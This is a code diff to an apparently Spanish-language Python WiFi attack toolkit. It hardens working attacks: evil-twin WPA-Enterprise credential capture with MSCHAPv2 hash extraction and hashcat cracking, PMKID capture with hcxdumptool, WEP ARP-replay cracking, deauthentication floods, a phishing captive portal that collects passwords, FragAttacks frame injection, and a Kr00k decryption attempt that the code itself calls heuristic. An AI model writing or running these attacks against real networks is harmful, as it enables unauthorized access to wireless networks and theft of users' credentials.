@@ -939,10 +939,25 @@ def modo_wizard():
                     _f.write("\n".join(_wpe_captured))
                 clave  = _wpe_captured[0][:60]
                 metodo = "WPA Enterprise MSCHAPv2 hash"
-                if check_tool("asleap"):
-                    _wl = find_wordlist()
-                    if _wl:
-                        run(f"asleap -W {_wl} -C {_wpe_creds} 2>/dev/null")
+                # Parse challenge/response from hostapd-wpe log
+                _chap_found = False
+                if os.path.exists(_wpe_creds):
+                    _content = open(_wpe_creds).read()
+                    _user_m = re.search(r'username:\s*(\S+)', _content)
+                    _nt_m   = re.search(r'NT-Response:\s*([0-9a-f]+)', _content, re.I)
+                    _ch_m   = re.search(r'challenge:\s*([0-9a-f]+)', _content, re.I)
+                    if _user_m and _nt_m and _ch_m:
+                        _hash_line = f"{_user_m.group(1)}::::{_ch_m.group(1)}:{_nt_m.group(1)}"
+                        _hash_file = "/tmp/herradura_wpe_hash.txt"
+                        with open(_hash_file, "w") as _hf: _hf.write(_hash_line + "\n")
+                        ok(f"Hash extraído: {_hash_line[:60]}...")
+                        _wl = find_wordlist()
+                        if _wl:
+                            run(f"hashcat -m 5500 {_hash_file} {_wl} --force --cpu-affinity=1 -u 512 2>/dev/null")
+                        _chap_found = True
+                if not _chap_found:
+                    info(f"Credenciales capturadas en: {_wpe_creds}")
+                    info("Analice manualmente o espere más intentos de autenticación.")
             else:
                 warn("Sin credenciales Enterprise capturadas.")
 
@@ -1081,9 +1096,14 @@ def modo_wizard():
                     time.sleep(0.5)
                 time.sleep(2)
                 _cap_kr_p.terminate()
-                _null_k = "00" * 16
+                _cap_kr_p.wait()
                 _dec_kr = _cap_kr.replace(".pcap", "-dec.pcap")
-                run(f"airdecap-ng -l -b {bssid} -k {_null_k} {_cap_kr} 2>/dev/null", capture=True)
+                # Kr00k: -k is WEP-only; use -e/-p for WPA. Real Kr00k requires null TK from packet capture.
+                try:
+                    run(f"airdecap-ng -l -b {bssid} -e \"{essid}\" -p \"Kr00kNullKey\" {_cap_kr} 2>/dev/null", capture=True)
+                    info("Nota: Kr00k real requiere TK nulo extraído de la captura. Este intento es heurístico.")
+                except Exception:
+                    pass
                 if os.path.exists(_dec_kr) and os.path.getsize(_dec_kr) > 0:
                     ok(f"Kr00k: frames descifrados con clave nula → {_dec_kr}")
                     if check_tool("tshark"):
@@ -1735,15 +1755,24 @@ def pmkid_attack():
 
     os.makedirs("scan-output", exist_ok=True)
     out_file = "scan-output/pmkid_capture.pcapng"
-    filter_flag = f"--filterlist_ap={bssid} --filtermode=2" if bssid else ""
+    if bssid:
+        _filter_f = f"/tmp/hcx_filter_{bssid.replace(':','')}.txt"
+        with open(_filter_f, "w") as _ff: _ff.write(bssid.upper() + "\n")
+        filter_flag = f"--filterlist_ap={_filter_f} --filtermode=2"
+    else:
+        filter_flag = ""
 
     info(f"Capturando PMKID durante {t} segundos...")
     tip("Si ve 'FOUND PMKID' en la terminal, el ataque fue exitoso.")
     time.sleep(1)
+
+    _hcx_proc = subprocess.Popen(f"timeout {t} hcxdumptool -i {interfaz} -o {out_file} {filter_flag} --active_beacon 2>/dev/null", shell=True, stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     progress_bar(t, "Capturando PMKID")
+    _hcx_proc.terminate()
+    _hcx_proc.wait()
 
     try:
-        run(f"timeout {t} hcxdumptool -i {interfaz} -o {out_file} {filter_flag} --active_beacon --enable_status=3")
+        pass  # hcxdumptool already ran above
     except KeyboardInterrupt:
         pass
 
@@ -2140,6 +2169,7 @@ text-align:center;box-shadow:0 4px 20px rgba(0,0,0,.1);max-width:360px;width:90%
 
     # Limpieza
     deauth_proc.terminate()
+    deauth_proc.wait()
     ab_proc.terminate(); ab_proc.wait()
     dm_proc.terminate(); dm_proc.wait()
     httpd.shutdown()
@@ -2439,6 +2469,12 @@ log-dhcp
             length = int(self.headers.get("Content-Length", 0))
             data   = self.rfile.read(length).decode(errors="replace")
             pwd    = parse_qs(data).get("pass", [""])[0].strip()
+            if not pwd or len(pwd) < 8:
+                self.send_response(200)
+                self.send_header("Content-Type", "text/html; charset=utf-8")
+                self.end_headers()
+                self.wfile.write(b"<html><body><h2>La contrase\xc3\xb1a debe tener al menos 8 caracteres.</h2><a href='/'>Reintentar</a></body></html>")
+                return
             ip     = self.client_address[0]
             import datetime as _dt
             ts     = _dt.datetime.now().strftime("%H:%M:%S")
@@ -2529,6 +2565,7 @@ h2{color:#2e7d32;margin-bottom:8px}p{color:#666;font-size:14px}</style>
 
     # ── Cleanup ───────────────────────────────────────────────────────────────
     deauth_proc.terminate()
+    deauth_proc.wait()
     hp.terminate(); hp.wait()
     dm.terminate(); dm.wait()
     httpd.shutdown()
@@ -3435,6 +3472,17 @@ def wpa_enterprise_attack():
     if tool == "hostapd":
         warn("hostapd-wpe no encontrado. Usando hostapd (captura limitada).")
 
+    _cert_ok = all(os.path.exists(p) for p in [
+        "/etc/hostapd-wpe/certs/ca.pem",
+        "/etc/hostapd-wpe/certs/server.pem",
+        "/etc/hostapd-wpe/certs/server.key"
+    ])
+    if not _cert_ok:
+        warn("Certificados hostapd-wpe no encontrados en /etc/hostapd-wpe/certs/")
+        warn("Instale: sudo apt install hostapd-wpe")
+        pause_back()
+        return
+
     iface  = ask("Interfaz WiFi (ej: wlan0)")
     essid  = ask("SSID de la red corporativa a clonar")
     channel = ask("Canal de la red")
@@ -3510,18 +3558,27 @@ wpe_logfile={log_file}
             c = f.read().strip()
         if c:
             print(f"\n{YELLOW}{c}{END}\n")
-            if check_tool("asleap"):
-                crack_it = ask("¿Intentar crackear MSCHAPv2 con asleap? (s/n)")
-                if crack_it.lower() == "s":
-                    wl = select_wordlist()
-                    if wl:
-                        run(f"asleap -W {wl} -C {creds_file}")
-            elif check_tool("hashcat"):
-                crack_it = ask("¿Intentar crackear con hashcat (-m 5500)? (s/n)")
-                if crack_it.lower() == "s":
-                    wl = select_wordlist()
-                    if wl:
-                        run(f"hashcat -m 5500 {creds_file} {wl} --force")
+            # Parse challenge/response from hostapd-wpe log
+            _chap_found = False
+            if os.path.exists(creds_file):
+                _content = open(creds_file).read()
+                _user_m = re.search(r'username:\s*(\S+)', _content)
+                _nt_m   = re.search(r'NT-Response:\s*([0-9a-f]+)', _content, re.I)
+                _ch_m   = re.search(r'challenge:\s*([0-9a-f]+)', _content, re.I)
+                if _user_m and _nt_m and _ch_m:
+                    _hash_line = f"{_user_m.group(1)}::::{_ch_m.group(1)}:{_nt_m.group(1)}"
+                    _hash_file = "/tmp/herradura_wpe_hash.txt"
+                    with open(_hash_file, "w") as _hf: _hf.write(_hash_line + "\n")
+                    ok(f"Hash extraído: {_hash_line[:60]}...")
+                    crack_it = ask("¿Intentar crackear MSCHAPv2 con hashcat? (s/n)")
+                    if crack_it.lower() == "s":
+                        wl = select_wordlist()
+                        if wl:
+                            run(f"hashcat -m 5500 {_hash_file} {wl} --force --cpu-affinity=1 -u 512 2>/dev/null")
+                    _chap_found = True
+            if not _chap_found:
+                info(f"Credenciales capturadas en: {creds_file}")
+                info("Analice manualmente o espere más intentos de autenticación.")
     pause_back()
 
 # ═════════════════════════════════════════════════════════════════════════════
@@ -3551,7 +3608,7 @@ def wep_full_attack():
     separador("PASO 1/4: FAKE AUTH")
     info("Asociando adaptador al AP objetivo...")
     tip("Necesario para que el AP acepte nuestros paquetes.")
-    auth_out = run(f"aireplay-ng -1 0 -a {bssid} -e {essid} {interfaz}", capture=True) or ""
+    auth_out = run(f"aireplay-ng -1 0 -a {bssid} -e \"{essid}\" {interfaz}", capture=True) or ""
     if "association successful" in auth_out.lower() or "successful" in auth_out.lower():
         ok("Fake auth exitosa.")
     else:
@@ -3570,9 +3627,11 @@ def wep_full_attack():
     tip("Cuantos más IVs, más rápido el crack. Objetivo: 100.000+")
     warn("Presione CTRL+C cuando tenga suficientes IVs o tras 2 minutos.")
 
+    _src_mac = run(f"cat /sys/class/net/{interfaz}/address 2>/dev/null", capture=True) or "00:11:22:33:44:55"
+    _src_mac = _src_mac.strip()
     try:
         subprocess.run(
-            f"aireplay-ng -3 -b {bssid} -h {interfaz} {interfaz}",
+            f"aireplay-ng -3 -b {bssid} -h {_src_mac} {interfaz}",
             shell=True, timeout=120
         ,
             stdin=subprocess.DEVNULL)
@@ -3580,6 +3639,7 @@ def wep_full_attack():
         pass
 
     cap_proc.terminate()
+    cap_proc.wait()
     time.sleep(2)
 
     separador("PASO 4/4: CRACKEAR")
@@ -4597,18 +4657,20 @@ def auto_pwner():
             info("Vector: WEP → ARP replay automático")
             os.makedirs("handshakes", exist_ok=True)
             out_base = f"handshakes/auto_wep_{essid_s}"
-            run(f"aireplay-ng -1 0 -a {bssid} -e {essid} {interfaz} 2>/dev/null")
+            _src_mac = run(f"cat /sys/class/net/{interfaz}/address 2>/dev/null", capture=True) or "00:11:22:33:44:55"
+            _src_mac = _src_mac.strip()
+            run(f"aireplay-ng -1 0 -a {bssid} -e \"{essid}\" {interfaz} 2>/dev/null")
             cap_p = subprocess.Popen(
                 f"airodump-ng -c {channel} --bssid {bssid} -w {out_base} {interfaz}",
                 shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             time.sleep(3)
             try:
-                subprocess.run(f"aireplay-ng -3 -b {bssid} -h {interfaz} {interfaz}",
+                subprocess.run(f"aireplay-ng -3 -b {bssid} -h {_src_mac} {interfaz}",
                                shell=True, timeout=60,
                                    stdin=subprocess.DEVNULL)
             except (subprocess.TimeoutExpired, KeyboardInterrupt):
                 pass
-            cap_p.terminate(); time.sleep(2)
+            cap_p.terminate(); cap_p.wait(); time.sleep(2)
             cap_file = out_base + "-01.cap"
             res = run(f"aircrack-ng {cap_file} 2>/dev/null", capture=True) or ""
             _wep_key = _parse_aircrack_key(res)
@@ -4652,10 +4714,12 @@ def auto_pwner():
             pmkid_file = f"scan-output/auto_pmkid_{essid_s}.pcapng"
             hc_file    = f"scan-output/auto_pmkid_{essid_s}.hc22000"
             run(f"rm -f {pmkid_file} {hc_file} 2>/dev/null")
+            _filter_f = f"/tmp/hcx_filter_{bssid.replace(':','')}.txt"
+            with open(_filter_f, "w") as _ff: _ff.write(bssid.upper() + "\n")
+            _hcx_proc = subprocess.Popen(f"timeout 30 hcxdumptool -i {interfaz} -o {pmkid_file} --filterlist_ap={_filter_f} --filtermode=2 --active_beacon 2>/dev/null", shell=True, stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             progress_bar(30, f"PMKID de {essid}")
-            run(f"timeout 30 hcxdumptool -i {interfaz} -o {pmkid_file} "
-                f"--filterlist_ap={bssid} --filtermode=2 --active_beacon "
-                f"--enable_status=3 2>/dev/null")
+            _hcx_proc.terminate()
+            _hcx_proc.wait()
             if os.path.exists(pmkid_file) and check_tool("hcxpcapngtool"):
                 run(f"hcxpcapngtool -o {hc_file} {pmkid_file} 2>/dev/null")
             if os.path.exists(hc_file) and os.path.getsize(hc_file) > 0 and check_tool("hashcat"):
@@ -4704,6 +4768,7 @@ def auto_pwner():
             run(f"aireplay-ng -0 20 -a {bssid} {interfaz} 2>/dev/null")
             time.sleep(5)
             cap_p.terminate()
+            cap_p.wait()
 
             ok_hs, cap_file = verify_handshake(ruta)
             if ok_hs:
@@ -5076,9 +5141,12 @@ bssid={bssid}
         pmkid_f = f"scan-output/pmkid_{essid_s}.pcapng"
         hc_f    = f"scan-output/pmkid_{essid_s}.hc22000"
         info("Capturando PMKID (40 segundos)...")
+        _filter_f = f"/tmp/hcx_filter_{bssid.replace(':','')}.txt"
+        with open(_filter_f, "w") as _ff: _ff.write(bssid.upper() + "\n")
+        _hcx_proc = subprocess.Popen(f"timeout 40 hcxdumptool -i {interfaz} -o {pmkid_f} --filterlist_ap={_filter_f} --filtermode=2 --active_beacon 2>/dev/null", shell=True, stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         progress_bar(40, f"PMKID {essid}")
-        run(f"timeout 40 hcxdumptool -i {interfaz} -o {pmkid_f} "
-            f"--filterlist_ap={bssid} --filtermode=2 --active_beacon 2>/dev/null")
+        _hcx_proc.terminate()
+        _hcx_proc.wait()
         if check_tool("hcxpcapngtool") and os.path.exists(pmkid_f):
             run(f"hcxpcapngtool -o {hc_f} {pmkid_f} 2>/dev/null")
         if os.path.exists(hc_f) and os.path.getsize(hc_f) > 0:
@@ -5410,12 +5478,15 @@ def _cve_kr00k():
     info(f"Captura guardada: {cap_file}")
     info("Intentando descifrar con clave TKIP/CCMP nula (all-zeros)...")
 
-    # Intentar con airdecap-ng con clave nula (00:00:00:00:00:00...)
-    null_key = "00" * 16  # 128-bit null key
-    out = run(
-        f"airdecap-ng -l -b {bssid} -k {null_key} {cap_file} 2>/dev/null",
-        capture=True
-    ) or ""
+    # Kr00k: -k is WEP-only; use -e/-p for WPA. Real Kr00k requires null TK from packet capture.
+    info("Nota: Kr00k real requiere TK nulo extraído de la captura. Este intento es heurístico.")
+    try:
+        out = run(
+            f"airdecap-ng -l -b {bssid} -e \"{essid}\" -p \"Kr00kNullKey\" {cap_file} 2>/dev/null",
+            capture=True
+        ) or ""
+    except Exception:
+        out = ""
     dec_file = cap_file.replace(".pcap", "-dec.pcap")
 
     if os.path.exists(dec_file) and os.path.getsize(dec_file) > 0:
@@ -5508,9 +5579,11 @@ def _cve_fragattacks():
                 tip("Esto prueba si el AP acepta A-MSDU con SPP=0 (CVE-2020-24588)")
 
                 # Frame 802.11 con A-MSDU flag seteado (bit 7 del QoS control)
+                _iface_mac = run(f"cat /sys/class/net/{interfaz}/address 2>/dev/null", capture=True) or "02:00:00:00:00:00"
+                _iface_mac = _iface_mac.strip()
                 dot11 = (RadioTap() /
                          Dot11(type=2, subtype=8,
-                               addr1=bssid, addr2=interfaz, addr3=bssid,
+                               addr1=bssid, addr2=_iface_mac, addr3=bssid,
                                FCfield="to-DS") /
                          Raw(load=b"\x00\x22" +  # QoS: A-MSDU present
                                   b"\xaa\xaa\x03\x00\x00\x00\x08\x00" +  # SNAP
@@ -5573,6 +5646,16 @@ def _cve_eap_downgrade():
     else:
         error("Necesita hostapd-wpe (preferido) o hostapd.")
         info("sudo apt install hostapd-wpe")
+        pause_back(); return
+
+    _cert_ok = all(os.path.exists(p) for p in [
+        "/etc/hostapd-wpe/certs/ca.pem",
+        "/etc/hostapd-wpe/certs/server.pem",
+        "/etc/hostapd-wpe/certs/server.key"
+    ])
+    if not _cert_ok:
+        warn("Certificados hostapd-wpe no encontrados en /etc/hostapd-wpe/certs/")
+        warn("Instale: sudo apt install hostapd-wpe")
         pause_back(); return
 
     iface    = ask("Interfaz para el AP RADIUS falso")
@@ -5663,12 +5746,27 @@ wpe_logfile={eap_log}
             print(f"  {GREEN}{c}{END}")
         info(f"Guardadas en: {creds_out}")
         # Intentar crackear MSCHAPv2
-        if check_tool("asleap") and any("mschapv2" in c.lower() for c in captured):
-            crack_it = ask("¿Crackear MSCHAPv2 con asleap? (s/n)")
-            if crack_it.lower() == "s":
-                wl = select_wordlist()
-                if wl:
-                    run(f"asleap -W {wl} -C {creds_out}")
+        # Parse challenge/response from hostapd-wpe log
+        _chap_found = False
+        if os.path.exists(creds_out):
+            _content = open(creds_out).read()
+            _user_m = re.search(r'username:\s*(\S+)', _content)
+            _nt_m   = re.search(r'NT-Response:\s*([0-9a-f]+)', _content, re.I)
+            _ch_m   = re.search(r'challenge:\s*([0-9a-f]+)', _content, re.I)
+            if _user_m and _nt_m and _ch_m:
+                _hash_line = f"{_user_m.group(1)}::::{_ch_m.group(1)}:{_nt_m.group(1)}"
+                _hash_file = "/tmp/herradura_wpe_hash.txt"
+                with open(_hash_file, "w") as _hf: _hf.write(_hash_line + "\n")
+                ok(f"Hash extraído: {_hash_line[:60]}...")
+                crack_it = ask("¿Crackear MSCHAPv2 con hashcat? (s/n)")
+                if crack_it.lower() == "s":
+                    wl = select_wordlist()
+                    if wl:
+                        run(f"hashcat -m 5500 {_hash_file} {wl} --force --cpu-affinity=1 -u 512 2>/dev/null")
+                _chap_found = True
+        if not _chap_found:
+            info(f"Credenciales capturadas en: {creds_out}")
+            info("Analice manualmente o espere más intentos de autenticación.")
     else:
         info("Sin credenciales capturadas. Posiblemente los clientes tienen parche.")
     pause_back()
@@ -5825,7 +5923,7 @@ def _cve_dragonblood_plus():
         if check_tool("mdk4"):
             warn("Iniciando flood con mdk4. CTRL+C para detener.")
             try:
-                run(f"mdk4 {interfaz} s -t {bssid} 2>/dev/null")
+                run(f"mdk4 {interfaz} d -B {bssid} 2>/dev/null")
             except KeyboardInterrupt:
                 pass
         else:
@@ -5904,12 +6002,16 @@ def _cve_kr00k_pmkid_chain():
         time.sleep(0.4)
     time.sleep(2)
     cap_p.terminate()
+    cap_p.wait()
 
-    null_key = "00"*16
     dec_f    = cap_f.replace(".pcap","-dec.pcap")
     kr00k_ok = False
     if os.path.exists(cap_f) and os.path.getsize(cap_f) > 100:
-        run(f"airdecap-ng -l -b {bssid} -k {null_key} {cap_f} 2>/dev/null")
+        # Kr00k: -k is WEP-only; use -e/-p for WPA. Real Kr00k requires null TK.
+        try:
+            run(f"airdecap-ng -l -b {bssid} -e \"{essid}\" -p \"Kr00kNullKey\" {cap_f} 2>/dev/null")
+        except Exception:
+            pass
         if os.path.exists(dec_f) and os.path.getsize(dec_f) > 0:
             ok(f"Kr00k exitoso: {dec_f}")
             kr00k_ok = True
@@ -5920,9 +6022,12 @@ def _cve_kr00k_pmkid_chain():
         step(2,"PMKID: captura hash sin clientes")
         pmkid_f = f"scan-output/{essid_s}_chain.pcapng"
         hc_f    = f"scan-output/{essid_s}_chain.hc22000"
+        _filter_f = f"/tmp/hcx_filter_{bssid.replace(':','')}.txt"
+        with open(_filter_f, "w") as _ff: _ff.write(bssid.upper() + "\n")
+        _hcx_proc = subprocess.Popen(f"timeout 35 hcxdumptool -i {interfaz} -o {pmkid_f} --filterlist_ap={_filter_f} --filtermode=2 --active_beacon 2>/dev/null", shell=True, stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         progress_bar(35, f"PMKID {essid}")
-        run(f"timeout 35 hcxdumptool -i {interfaz} -o {pmkid_f} "
-            f"--filterlist_ap={bssid} --filtermode=2 --active_beacon 2>/dev/null")
+        _hcx_proc.terminate()
+        _hcx_proc.wait()
         if check_tool("hcxpcapngtool") and os.path.exists(pmkid_f):
             run(f"hcxpcapngtool -o {hc_f} {pmkid_f} 2>/dev/null")
         if os.path.exists(hc_f) and os.path.getsize(hc_f)>0:
@@ -6307,10 +6412,12 @@ def smart_exploit_target(eng: ExploitEngine) -> tuple:
             run(f"rm -f {pcap} {hc22} 2>/dev/null")
             # Captura con association frames activos
             eng.update_phase(5)
+            _filter_f = f"/tmp/hcx_filter_{bssid.replace(':','')}.txt"
+            with open(_filter_f, "w") as _ff: _ff.write(bssid.upper() + "\n")
             capture_proc = subprocess.Popen(
                 f"hcxdumptool -i {iface} -o {pcap} "
-                f"--filterlist_ap={bssid} --filtermode=2 "
-                f"--active_beacon --enable_status=3 2>/dev/null",
+                f"--filterlist_ap={_filter_f} --filtermode=2 "
+                f"--active_beacon 2>/dev/null",
                 shell=True,
                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
             )
@@ -6528,10 +6635,12 @@ def smart_exploit_target(eng: ExploitEngine) -> tuple:
         hc222 = f"exploit-engine/pmkid2_{essid_s}.hc22000"
         run(f"rm -f {pcap2} {hc222} 2>/dev/null")
         eng.update_phase(5)
+        _filter_f = f"/tmp/hcx_filter_{bssid.replace(':','')}.txt"
+        with open(_filter_f, "w") as _ff: _ff.write(bssid.upper() + "\n")
         cap2 = subprocess.Popen(
             f"hcxdumptool -i {iface} -o {pcap2} "
-            f"--filterlist_ap={bssid} --filtermode=2 "
-            f"--active_beacon --enable_status=3 2>/dev/null",
+            f"--filterlist_ap={_filter_f} --filtermode=2 "
+            f"--active_beacon 2>/dev/null",
             shell=True,
             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
         )
